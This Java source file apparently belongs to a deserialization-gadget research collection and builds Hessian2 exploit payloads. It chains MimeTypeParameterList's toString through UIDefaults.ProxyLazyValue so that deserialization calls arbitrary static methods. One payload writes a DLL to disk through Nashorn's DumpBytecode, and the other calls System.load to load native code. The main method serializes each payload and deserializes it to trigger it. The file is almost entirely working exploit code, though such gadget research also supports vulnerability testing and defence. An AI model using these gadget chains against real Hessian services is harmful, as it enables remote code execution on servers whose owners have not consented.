package com.test.gadget.toStringBased;

import jdk.nashorn.internal.runtime.ScriptEnvironment;
import jdk.nashorn.internal.runtime.logging.DebugLogger;
import tools.HessianTools;
import tools.IOTools;
import tools.ReflectTools;
import tools.UnsafeTools;

import javax.activation.MimeTypeParameterList;
import javax.swing.*;

public class MimeTypeParameterList_ProxyLazyValue_Sysload {
    public static void main(String[] args) throws Exception {
//        Object payload = writeFilePayload();
//        byte[] bytes = HessianTools.hessian2ToStringSer(payload);
//        HessianTools.hessian2Deser(bytes);

        Object o = sysLoadPayload();
        byte[] bytes1 = HessianTools.hessian2ToStringSer(o);
        HessianTools.hessian2Deser(bytes1);
    }

    public static Object writeFilePayload() throws Exception {
        Object scriptenv = UnsafeTools.getObjectByUnsafe(ScriptEnvironment.class);
        ReflectTools.setFieldValue(scriptenv, "_print_code", false);
        ReflectTools.setFieldValue(scriptenv, "_dest_dir", "D:/");

        Object debug = UnsafeTools.getObjectByUnsafe(DebugLogger.class);
        byte[] bytes = IOTools.readFile("D:/1tmp/gcc/dynamic.dll");

        UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue("jdk.nashorn.internal.codegen.DumpBytecode", "dumpBytecode", new Object[]{scriptenv, debug, bytes, "test"});
        ReflectTools.setFieldValue(proxyLazyValue, "acc", null);

        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put("1diot9", proxyLazyValue);

        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();
        ReflectTools.setFieldValue(mimeTypeParameterList, "parameters", uiDefaults);

        return mimeTypeParameterList;
    }

    public static Object sysLoadPayload() throws Exception {

        UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue("java.lang.System", "load", new Object[]{"D:/test.class"});
        ReflectTools.setFieldValue(proxyLazyValue, "acc", null);

        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put("1diot9", proxyLazyValue);

        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();
        ReflectTools.setFieldValue(mimeTypeParameterList, "parameters", uiDefaults);

        return mimeTypeParameterList;
    }
}
